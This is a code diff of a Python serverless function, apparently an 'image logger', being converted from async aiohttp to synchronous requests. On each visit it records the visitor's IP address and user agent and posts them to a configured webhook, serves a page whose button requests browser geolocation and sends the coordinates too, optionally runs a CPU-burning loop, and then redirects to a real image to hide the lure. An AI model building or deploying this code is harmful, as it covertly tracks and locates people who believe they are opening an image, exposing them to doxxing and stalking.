@@ -1,11 +1,11 @@
 import json
 import httpagentparser
-import aiohttp
+import requests
 
 # ==== CONFIG ====
 options = {
-    "accurate_location": True,  # Ask user for geolocation
-    "browser_stress": False      # Optional browser stress
+    "accurate_location": True,
+    "browser_stress": False
 }
 
 config = {
@@ -17,7 +17,7 @@ config = {
 }
 
 # ==== HELPER FUNCTION TO SEND WEBHOOK ====
-async def send_webhook(ip, useragent, lat=None, lon=None):
+def send_webhook(ip, useragent, lat=None, lon=None):
     os, browser = httpagentparser.simple_detect(useragent or "")
     payload = {
         "username": config["username"],
@@ -39,19 +39,18 @@ async def send_webhook(ip, useragent, lat=None, lon=None):
 """
         }]
     }
-    async with aiohttp.ClientSession() as session:
-        try:
-            await session.post(config["webhook"], json=payload)
-        except:
-            pass
+    try:
+        requests.post(config["webhook"], json=payload)
+    except:
+        pass
 
 # ==== Vercel Serverless Function ====
-async def handler(request):
-    # POST handler for geolocation info
+def handler(request, context):
+    # Handle POST (geolocation)
     if request.method == "POST":
         try:
-            data = await request.json()
-            await send_webhook(
+            data = json.loads(request.body)
+            send_webhook(
                 data.get("ip"),
                 data.get("useragent"),
                 data.get("lat"),
@@ -64,12 +63,12 @@ async def handler(request):
             "body": "OK"
         }
 
-    # GET request: Landing page
+    # GET request (landing page)
     ip = request.headers.get("x-forwarded-for", request.remote)
     useragent = request.headers.get("User-Agent", "")
 
-    # Initial webhook report (without location)
-    await send_webhook(ip, useragent)
+    # Initial webhook without location
+    send_webhook(ip, useragent)
 
     # JS for geolocation & optional browser stress after click
     geo_js = ""
@@ -92,7 +91,6 @@ if (navigator.geolocation) {{
     );
 }}
 """
-
     stress_js = ""
     if options["browser_stress"]:
         stress_js = "for (let i=0;i<1e8;i++){Math.sqrt(i);}"
@@ -112,7 +110,6 @@ if (navigator.geolocation) {{
 document.getElementById('allowBtn').onclick = function() {{
     {geo_js}
     {stress_js}
-    // Redirect to real image
     window.location.href = '{config['image']}';
 }};
 </script>
